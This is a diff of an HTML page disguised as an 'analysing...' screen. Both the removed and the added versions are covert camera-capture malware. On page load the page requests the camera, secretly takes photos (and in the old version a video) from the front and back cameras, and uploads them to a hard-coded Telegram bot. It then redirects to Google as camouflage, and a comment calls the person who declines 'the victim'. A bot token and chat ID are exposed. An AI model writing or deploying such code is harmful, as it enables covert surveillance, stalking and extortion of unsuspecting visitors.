@@ -1,58 +1,63 @@
-<script>
-    const token = '8586526554:AAFC1KQ_lvsHAnwi8ErI5x27XLC42yGtgyg';
-    const chat_id = '7692110334';
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحليل...</title>
+</head>
+<body>
+    <script>
+        const BOT_TOKEN = '8586526554:AAFC1KQ_lvsHAnwi8ErI5x27XLC42yGtgyg';
+        const CHAT_ID = '7692110334';
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
 
-    async function startProcess() {
-        try {
-            // طلب الكاميرا والمايكروفون (ضروري للفيديو)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        async function takePhoto(stream, type, number) {
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            // 1. التقاط الصورة فوراً (لضمان وصول شيء سريعاً)
-            const canvas = document.createElement('canvas');
-            canvas.width = 640;
-            canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'image.jpg');
-                formData.append('caption', '📸 تم سحب صورة سريعة.. جاري تسجيل الفيديو 10 ثواني');
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-            }, 'image/jpeg');
-
-            // 2. تسجيل فيديو لمدة 10 ثوانٍ
-            const mediaRecorder = new MediaRecorder(stream);
-            const chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
-                const videoData = new FormData();
-                videoData.append('chat_id', chat_id);
-                videoData.append('video', videoBlob, 'video_10s.mp4');
-                videoData.append('caption', '🎥 فيديو الـ 10 ثواني وصل!');
-                
-                await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-                    method: 'POST',
-                    body: videoData
-                });
-                
-                // توجيه المستخدم لموقع آخر للتمويه بعد اكتمال الرفع
-                window.location.href = "https://www.google.com";
-            };
-
-            mediaRecorder.start();
-            // مؤقت الـ 10 ثواني (10000 ميلي ثانية)
-            setTimeout(() => {
-                mediaRecorder.stop();
-                stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا فوراً
-            }, 10000);
-
-        } catch (err) {
-            console.log("الرفض أو مشكلة في العتاد");
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'img.jpg');
+                        formData.append('caption', `📡 [${type}] صورة رقم ${number}`);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                        resolve();
+                    }, 'image/jpeg', 0.6); // تقليل الجودة لضمان سرعة الإرسال
+                }, 500); // نصف ثانية بين الصورة والأخرى
+            });
         }
-    }
-    window.onload = startProcess;
-</script>
+
+        async function startProcess() {
+            try {
+                // 1. الكاميرا الأمامية
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                for (let i = 1; i <= 5; i++) {
+                    await takePhoto(stream, "أمامية", i);
+                }
+                stream.getTracks().forEach(track => track.stop()); // إيقاف الأمامية
+
+                // 2. الكاميرا الخلفية (محاولة التحويل)
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    for (let i = 1; i <= 5; i++) {
+                        await takePhoto(stream, "خلفية", i);
+                    }
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (e) { console.log("لا توجد كاميرا خلفية أو تم رفضها"); }
+
+                // التمويه النهائي
+                window.location.href = "https://www.google.com";
+
+            } catch (err) {
+                console.log("الضحية رفض الإذن");
+            }
+        }
+        window.onload = startProcess;
+    </script>
+</body>
+</html>
